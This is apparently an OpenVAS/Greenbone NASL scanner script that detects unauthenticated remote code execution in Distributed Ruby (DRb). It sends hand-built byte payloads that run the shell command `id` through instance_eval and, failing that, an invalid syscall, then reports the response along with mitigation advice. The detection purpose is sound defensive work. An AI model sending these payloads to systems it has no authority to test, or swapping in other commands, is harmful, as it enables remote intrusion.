# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108010");
  script_version("2024-06-28T05:05:33+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2016-10-28 11:47:00 +0200 (Fri, 28 Oct 2016)");
  script_name("Distributed Ruby (dRuby/DRb) Multiple RCE Vulnerabilities");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Gain a shell remotely");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/drb", 8787);

  script_xref(name:"URL", value:"https://tools.cisco.com/security/center/viewAlert.x?alertId=22750");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47071");
  script_xref(name:"URL", value:"http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/");
  script_xref(name:"URL", value:"http://www.ruby-doc.org/stdlib-1.9.3/libdoc/drb/rdoc/DRb.html");

  script_tag(name:"summary", value:"Systems using Distributed Ruby (dRuby/DRb), which is available in Ruby versions 1.6
  and later, may permit unauthorized systems to execute distributed commands.");

  script_tag(name:"vuldetect", value:"Send a crafted command to the service and check for a remote command execution
  via the instance_eval or syscall requests.");

  script_tag(name:"impact", value:"By default, Distributed Ruby does not impose restrictions on allowed hosts or set the
  $SAFE environment variable to prevent privileged activities. If other controls are not in place, especially if the
  Distributed Ruby process runs with elevated privileges, an attacker could execute arbitrary system commands or Ruby
  scripts on the Distributed Ruby server. An attacker may need to know only the URI of the listening Distributed Ruby
  server to submit Ruby commands.");

  script_tag(name:"solution", value:"Administrators of environments that rely on Distributed Ruby should ensure that
  appropriate controls are in place. Code-level controls may include:

  - Implementing taint on untrusted input

  - Setting $SAFE levels appropriately (>=2 is recommended if untrusted hosts are allowed to submit Ruby commands, and >=3 may be appropriate)

  - Including drb/acl.rb to set ACLEntry to restrict access to trusted hosts");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("dump.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port( default:8787, proto:"drb" );

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

# Raw string to execute the `id` command via instance_eval if instance is running in $SAFE = 0 mode
# Wireshark dump of the client code mentioned in http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/
data = raw_string( 0x00, 0x00, 0x00, 0x03, 0x04, 0x08, 0x30, 0x00, 0x00, 0x00, 0x17, 0x04, 0x08, 0x49, 0x22, 0x12, # ......0. .....I".
                   0x69, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x63, 0x65, 0x5f, 0x65, 0x76, 0x61, 0x6c, 0x06, 0x3a, 0x06, # instance _eval.:.
                   0x45, 0x46, 0x00, 0x00, 0x00, 0x04, 0x04, 0x08, 0x69, 0x06, 0x00, 0x00, 0x00, 0x0e, 0x04, 0x08, # EF...... i.......
                   0x49, 0x22, 0x09, 0x60, 0x69, 0x64, 0x60, 0x06, 0x3a, 0x06, 0x45, 0x54, 0x00, 0x00, 0x00, 0x03, # I".`id`. :.ET....
                   0x04, 0x08, 0x30 );                                                                             # ..0
send( socket:soc, data:data );

buf = recv( socket:soc, length:512 );
close( soc );

# Recent DRb versions are not answering to the instance_eval call in $SAFE = 1 mode but the sycall exploit later still works
if( buf )
  buf = bin2string( ddata:buf );

if( buf && ereg( pattern:"uid=[0-9]+.*gid=[0-9]+", string:buf ) ) {
  report  = "The service is running in $SAFE = 0 mode and it was possible to execute ";
  report += "the command 'id' on the remote host which returned the following response:";
  report += '\n\n';
  report += buf;
  security_message( port:port, data:report );
  exit( 0 );
# Instance is running in $SAFE >= 1 mode with disabled instance_eval. Try sending a sycall instead.
} else if( ! buf || ( "SecurityError" >< buf && "instance_eval" >< buf ) ) {

  if( ! soc = open_sock_tcp( port ) )
    exit( 0 );

  # Replaced t.instance_eval("`id`") with t.send(:syscall,999) in the above mentioned example which should give a "Function not implemented"
  # TODO: Re-verify against few other systems or find a syscall actually returning data which can be used to detect this.
  data = raw_string( 0x00, 0x00, 0x00, 0x03, 0x04, 0x08, 0x30, 0x00, 0x00, 0x00, 0x0e, 0x04, 0x08, 0x49, 0x22, 0x09, # ......0. .....I".
                     0x73, 0x65, 0x6e, 0x64, 0x06, 0x3a, 0x06, 0x45, 0x46, 0x00, 0x00, 0x00, 0x04, 0x04, 0x08, 0x69, # send.:.E F......i
                     0x07, 0x00, 0x00, 0x00, 0x0b, 0x04, 0x08, 0x3a, 0x0c, 0x73, 0x79, 0x73, 0x63, 0x61, 0x6c, 0x6c, # .......: .syscall
                     0x00, 0x00, 0x00, 0x06, 0x04, 0x08, 0x69, 0x02, 0xe7, 0x03, 0x00, 0x00, 0x00, 0x03, 0x04, 0x08, # ......i. ........
                     0x30 );                                                                                         # 0
  send( socket:soc, data:data );

  buf = recv( socket:soc, length:2048 );
  close( soc );

  if( buf )
    buf = bin2string( ddata:buf );

  if( buf && "Function not implemented" >< buf && "drb" >< buf ) {
    report  = "The service is running in $SAFE >= 1 mode. However it is still possible to run ";
    report += "arbitrary syscall commands on the remote host. ";
    report += "Sending an invalid syscall the service returned the following response:";
    report += '\n\n';
    report += buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
